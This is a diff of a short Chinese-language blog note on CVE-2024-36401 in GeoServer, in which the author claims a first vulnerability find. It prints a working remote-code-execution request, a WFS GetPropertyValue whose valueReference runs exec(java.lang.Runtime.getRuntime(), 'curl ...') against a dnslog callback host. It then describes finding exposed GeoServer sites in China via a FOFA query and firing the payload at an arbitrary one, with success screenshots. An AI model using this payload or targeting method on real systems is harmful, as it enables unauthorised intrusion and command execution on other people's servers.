@@ -1,9 +1,12 @@
-CVE-2024-36401
+# CVE-2024-36401
 
+<br>
 
+### 挖到了人生第一个洞,记一下过程
 
+<br>
 
-
+### poc展示
 
 ````
 
@@ -16,14 +19,36 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 X-Forwarded-For: 123.123.123.123
-Content-Length: 358
+Content-Length: 355
 
 <wfs:GetPropertyValue service='WFS' version='2.0.0'
- xmlns:topp='http://www.openplans.org/topp'
- xmlns:fes='http://www.opengis.net/fes/2.0'
- xmlns:wfs='http://www.opengis.net/wfs/2.0'>
-  <wfs:Query typeNames='sf:archsites'/>
-  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping edw9z2.dnslog.cn')</wfs:valueReference>
+xmlns:topp='http://www.openplans.org/topp'
+xmlns:fes='http://www.opengis.net/fes/2.0'
+xmlns:wfs='http://www.opengis.net/wfs/2.0'>
+<wfs:Query typeNames='sf:archsites'/>
+<wfs:valueReference>
+	exec(java.lang.Runtime.getRuntime(),'curl 5uzglt.dnslog.cn') </wfs:valueReference>
 </wfs:GetPropertyValue>
 
 ````
+
+<br>
+
+## 过程
+
+去fofa上搜索相关资产
+
+````
+app="GeoServer" && country="CN"
+````
+然后随便找一个网址，直接上POC即可
+
+<img src="https://54huarui.github.io/blogs/geo/2.png" width="880" height="480">
+
+<br>
+
+成功图示
+
+
+<img src="https://54huarui.github.io/blogs/geo/1.png" width="880" height="480">
+
